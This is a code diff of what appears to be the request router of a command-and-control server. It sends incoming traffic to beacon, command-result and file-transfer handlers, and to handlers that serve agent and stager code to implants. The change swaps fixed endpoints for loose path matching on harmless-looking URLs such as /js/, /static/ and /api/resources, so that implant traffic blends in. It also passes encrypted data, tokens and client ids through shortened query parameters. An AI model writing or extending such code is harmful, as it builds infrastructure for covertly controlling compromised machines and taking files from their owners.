@@ -75,28 +75,37 @@ class OperationRouter:
             method: HTTP method (GET or POST)
         """
         try:
-            # First check if the path matches any of our specific endpoint types
+            # First check if the path matches any endpoint types
             path = self.request_handler.path
             base_path = path.split('?')[0] if '?' in path else path
             endpoint_type = self.path_router.get_endpoint_type(base_path)
+            
+            # Parse query parameters for both GET and POST
+            query_params = self._parse_query_params(path)
             
             # Enhanced logging for request handling
             logger.info(f"Received {method} request on path: {path}")
             logger.info(f"Endpoint type identified as: {endpoint_type}")
             
-            # Handle direct agent/stager downloads based on path
-            if endpoint_type in ["agent_path", "previous_agent_path", "old_agent_path"]:
-                logger.info(f"Routing to agent_handler for agent code")
+            # Check for stager indicator in query parameters (new)
+            if 'type' in query_params and query_params['type'] == 'stager':
+                logger.info(f"Identified stager request from query parameter")
+                self.agent_handler.handle_stager_request()
+                return
+            
+            # Handle agent downloads based on operation type in payload
+            # All paths are now from the pool, so we need to check for special content
+            if self._looks_like_agent_request(path, method, query_params):
+                logger.info(f"Routing to agent_handler for agent code based on path pattern")
                 self.agent_handler.handle_agent_request()
                 return
-            elif endpoint_type in ["stager_path", "previous_stager_path", "old_stager_path"]:
-                logger.info(f"Routing to agent_handler for stager code")
+            elif self._looks_like_stager_request(path, method, query_params):
+                logger.info(f"Routing to agent_handler for stager code based on path pattern")
                 self.agent_handler.handle_stager_request()
                 return
             
             # Special check for paths that look like file operations
-            # This catches dynamic file paths that might not be explicitly mapped
-            if "/file/" in path or "/download/" in path or "/content/" in path:
+            if self._looks_like_file_operation(path):
                 logger.info(f"Path {path} appears to be a file operation path based on pattern")
                 # Check request contents to determine if it's a download or upload
                 if self._is_file_download_request(method):
@@ -106,29 +115,20 @@ class OperationRouter:
             
             # For other endpoints, try to extract payload data
             if method == "GET":
-                # Parse query string for data
-                query_string = self.request_handler.path.split('?', 1)[1] if '?' in self.request_handler.path else ''
-                query_params = {}
-                
-                if query_string:
-                    for param in query_string.split('&'):
-                        if '=' in param:
-                            key, value = param.split('=', 1)
-                            query_params[key] = urllib.parse.unquote(value)
-                
+                # Parse query string for data (already done above)
                 encrypted_data = query_params.get('d')  # Shortened from 'data'
                 token = query_params.get('t', '')       # Shortened from 'token'
                 is_first_contact = query_params.get('i', 'false').lower() == 'true'  # Shortened from 'init'
                 client_id = query_params.get('c')       # Shortened from 'client_id'
                 
                 if not encrypted_data:
-                    # If no data parameter but endpoint is a known type, route based on endpoint
-                    if endpoint_type in ["beacon_path", "previous_beacon_path", "old_beacon_path", "pool_path", "previous_pool_path", "old_pool_path"]:
+                    # If no data parameter, try to determine based on the path pattern
+                    if endpoint_type in ["pool_path", "previous_pool_path", "old_pool_path"]:
                         # This might be a ping or simple beacon
                         logger.info(f"Routing to beacon_handler (no data, endpoint type: {endpoint_type})")
                         self.beacon_handler.handle()
                         return
-                    elif endpoint_type in ["file_request_path", "previous_file_request_path", "old_file_request_path"]:
+                    elif endpoint_type in ["file_operation_path", "previous_file_operation_path", "old_file_operation_path"]:
                         # This might be a file download request
                         logger.info(f"Routing to file_download_handler (no data, endpoint type: {endpoint_type})")
                         self.file_download_handler.handle()
@@ -157,9 +157,9 @@ class OperationRouter:
                         self.send_error_response(400, "Missing data field")
                         return
                 except json.JSONDecodeError:
-                    # For non-JSON POST requests, check if the path suggests a file operation
-                    if endpoint_type in ["file_request_path", "previous_file_request_path", "old_file_request_path"]:
-                        logger.info(f"Non-JSON POST request to file_request_path, routing to file_download_handler")
+                    # For non-JSON POST requests, check if it's a file operation
+                    if self._looks_like_file_operation(path):
+                        logger.info(f"Non-JSON POST request to file operation path, routing to file_download_handler")
                         self.file_download_handler.handle()
                         return
                     else:
@@ -206,14 +206,14 @@ class OperationRouter:
                     try:
                         payload = json.loads(decrypted_data)
                     except json.JSONDecodeError:
-                        # If it can't be parsed as JSON, check path-based routing first
-                        if endpoint_type in ["file_request_path", "previous_file_request_path", "old_file_request_path"]:
-                            logger.info(f"Routing to file_download_handler based on endpoint type: {endpoint_type}")
+                        # If it can't be parsed as JSON, determine based on path patterns
+                        if self._looks_like_file_operation(path):
+                            logger.info(f"Routing to file_download_handler based on path pattern")
                             self.request_handler.decrypted_payload = decrypted_data
                             self.file_download_handler.handle()
                             return
-                        # Otherwise assume it's a beacon with simple data
                         else:
+                            # Assume it's a beacon with simple data
                             logger.info(f"Treating non-JSON decrypted data as beacon data")
                             self.request_handler.decrypted_payload = decrypted_data
                             self.beacon_handler.handle()
@@ -267,44 +267,89 @@ class OperationRouter:
                     logger.info(f"Routing to agent_handler (stager) based on op_type")
                     self.agent_handler.handle_stager_request()
                 else:
-                    # Default to endpoint type based on the URL path
+                    # Default based on path pattern
                     logger.info(f"No matching op_type, using endpoint type: {endpoint_type}")
-                    if endpoint_type in ["beacon_path", "previous_beacon_path", "old_beacon_path", "pool_path"]:
+                    if endpoint_type in ["pool_path", "previous_pool_path", "old_pool_path"]:
                         self.beacon_handler.handle()
-                    elif endpoint_type in ["cmd_result_path", "previous_cmd_result_path", "old_cmd_result_path"]:
-                        self.result_handler.handle()
-                    elif endpoint_type in ["file_upload_path", "previous_file_upload_path", "old_file_upload_path"]:
-                        # Path is for uploading FROM client TO server
-                        logger.info(f"Routing by path: file upload FROM client TO server")
-                        self.file_handler.handle()
-                    elif endpoint_type in ["file_request_path", "previous_file_request_path", "old_file_request_path"]:
-                        # Path is for downloading FROM server TO client
-                        logger.info(f"Routing by path: file download FROM server TO client")
-                        self.file_download_handler.handle()
+                    elif self._looks_like_file_operation(path):
+                        # Determine if it's a download or upload based on context
+                        if "upload" in path.lower() or "file_up" in operation_type.lower():
+                            logger.info(f"Routing by path: file upload FROM client TO server")
+                            self.file_handler.handle()
+                        else:
+                            logger.info(f"Routing by path: file download FROM server TO client")
+                            self.file_download_handler.handle()
                     else:
                         # Unknown operation type, log and send generic response
                         logger.warning(f"Unknown operation type: {operation_type}")
                         self.send_success_response()
             except json.JSONDecodeError as e:
                 # Handle direct request to endpoint without JSON payload
-                logger.info(f"JSON decode error, routing based on endpoint: {endpoint_type}")
-                if endpoint_type in ["beacon_path", "previous_beacon_path", "old_beacon_path", "pool_path"]:
-                    self.beacon_handler.handle()
-                elif endpoint_type in ["cmd_result_path", "previous_cmd_result_path", "old_cmd_result_path"]:
-                    self.result_handler.handle()
-                elif endpoint_type in ["file_upload_path", "previous_file_upload_path", "old_file_upload_path"]:
-                    self.file_handler.handle()
-                elif endpoint_type in ["file_request_path", "previous_file_request_path", "old_file_request_path"]:
+                logger.info(f"JSON decode error, routing based on endpoint pattern")
+                if self._looks_like_file_operation(path):
                     self.file_download_handler.handle()
                 else:
-                    logger.error(f"Error parsing operation payload: {e}")
-                    self.send_error_response(400, "Invalid payload format")
+                    self.beacon_handler.handle()
             except Exception as e:
                 logger.error(f"Error handling operation: {e}")
                 self.send_error_response(500, "Server error")
         except Exception as e:
             logger.error(f"Error in operation router: {e}")
             self.send_error_response(500, "Server error")
+    
+    def _parse_query_params(self, path):
+        """Parse query parameters from a URL path"""
+        query_params = {}
+        if '?' in path:
+            query_string = path.split('?', 1)[1]
+            for param in query_string.split('&'):
+                if '=' in param:
+                    key, value = param.split('=', 1)
+                    query_params[key] = urllib.parse.unquote(value)
+        return query_params
+    
+    def _looks_like_agent_request(self, path, method, query_params=None):
+        """Check if the request appears to be for agent code"""
+        # Check query parameters first
+        if query_params and 'type' in query_params and query_params['type'] == 'agent':
+            return True
+            
+        # Check path patterns as fallback
+        path_lower = path.lower()
+        return (
+            ("/agent" in path_lower or 
+             "/raw_agent" in path_lower or 
+             "/js/" in path_lower or
+             "/api/resources" in path_lower) and
+            method == "GET"
+        )
+    
+    def _looks_like_stager_request(self, path, method, query_params=None):
+        """Check if the request appears to be for stager code"""
+        # Check query parameters first
+        if query_params and 'type' in query_params and query_params['type'] == 'stager':
+            return True
+            
+        # Check path patterns as fallback
+        path_lower = path.lower()
+        return (
+            ("/stager" in path_lower or 
+             "/loader" in path_lower or 
+             "/bootstrap" in path_lower or
+             "/init" in path_lower) and
+            method == "GET"
+        )
+    
+    def _looks_like_file_operation(self, path):
+        """Check if the path appears to be for file operations"""
+        path_lower = path.lower()
+        return (
+            "/file" in path_lower or 
+            "/download" in path_lower or 
+            "/upload" in path_lower or 
+            "/content" in path_lower or
+            "/static/" in path_lower
+        )
     
     def _is_file_download_request(self, method):
         """
